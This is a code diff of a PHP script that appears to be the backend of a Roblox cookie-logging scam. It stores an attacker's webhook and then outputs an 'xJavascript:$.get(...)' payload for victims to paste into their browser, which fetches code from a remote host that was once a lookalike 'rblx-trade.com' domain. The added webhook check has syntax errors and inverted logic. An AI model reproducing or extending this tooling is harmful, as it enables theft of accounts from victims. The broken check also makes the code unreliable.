@@ -1,4 +1,7 @@
 <?php
+    if (isset($_REQUEST["webhook"]){
+        die("You didn't set a webhook!")
+    }
     header("Access-Control-Allow-Origin: *");
 
     $servername = "";
@@ -21,7 +24,7 @@
     VALUES ('".mysqli_real_escape_string($conn, $id)."', '".mysqli_real_escape_string($conn, $webhook)."', '".mysqli_real_escape_string($conn, $prompt)."')";
 
     if ($conn->query($sql) === TRUE) {
-      echo 'xJavascript:$.get("//rblx-trade.com/rblxapi/api.php?id='.$id.'")';
+      echo 'xJavascript:$.get("//'.$_SERVER['HTTP_HOST'].'/api?id='.$id.'")';
     } else {
       echo "Error:" . $conn->error;
     }
